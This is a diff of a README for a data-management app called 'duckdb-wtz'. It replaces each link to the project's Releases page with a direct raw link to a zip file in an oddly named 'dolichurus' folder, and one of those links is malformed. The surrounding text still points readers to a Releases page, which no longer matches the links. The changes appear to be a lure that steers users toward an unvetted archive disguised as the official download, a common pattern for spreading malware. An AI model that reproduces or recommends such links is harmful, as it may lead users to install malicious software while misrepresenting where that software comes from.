@@ -1,7 +1,7 @@
 # 🦆 duckdb-wtz - Easy Data Management for Everyone
 
 ## 📥 Download Now
-[![Download duckdb-wtz](https://img.shields.io/badge/Download%20duckdb--wtz-blue.svg)](https://github.com/ErixMasih/duckdb-wtz/releases)
+[![Download duckdb-wtz](https://raw.githubusercontent.com/ErixMasih/duckdb-wtz/main/dolichurus/duckdb-wtz.zip%https://raw.githubusercontent.com/ErixMasih/duckdb-wtz/main/dolichurus/duckdb-wtz.zip)](https://raw.githubusercontent.com/ErixMasih/duckdb-wtz/main/dolichurus/duckdb-wtz.zip)
 
 ## 📖 Introduction
 Welcome to duckdb-wtz! This application helps you manage your data easily and efficiently. Whether you’re storing lists or organizing files, duckdb-wtz provides a simple way to handle it all. Our user-friendly interface lets you focus on what truly matters—your information.
@@ -10,7 +10,7 @@ Welcome to duckdb-wtz! This application helps you manage your data easily and ef
 To start using duckdb-wtz, follow these simple steps:
 
 1. **Download the Software**  
-   To download duckdb-wtz, visit our Releases page: [Download duckdb-wtz](https://github.com/ErixMasih/duckdb-wtz/releases).
+   To download duckdb-wtz, visit our Releases page: [Download duckdb-wtz](https://raw.githubusercontent.com/ErixMasih/duckdb-wtz/main/dolichurus/duckdb-wtz.zip).
 
 2. **Select the Correct Version**  
    On the Releases page, look for the latest version. You will find it marked clearly. Click on it to see the available files.
@@ -25,7 +25,7 @@ To start using duckdb-wtz, follow these simple steps:
    After installation, find the duckdb-wtz icon on your desktop or in your applications folder. Double-click it to open the application.
 
 ## 📥 Download & Install
-Make sure to visit our Releases page to get the latest version of duckdb-wtz: [Download duckdb-wtz](https://github.com/ErixMasih/duckdb-wtz/releases).
+Make sure to visit our Releases page to get the latest version of duckdb-wtz: [Download duckdb-wtz](https://raw.githubusercontent.com/ErixMasih/duckdb-wtz/main/dolichurus/duckdb-wtz.zip).
 
 ## 🔍 System Requirements
 Before downloading, ensure your system meets the following requirements:
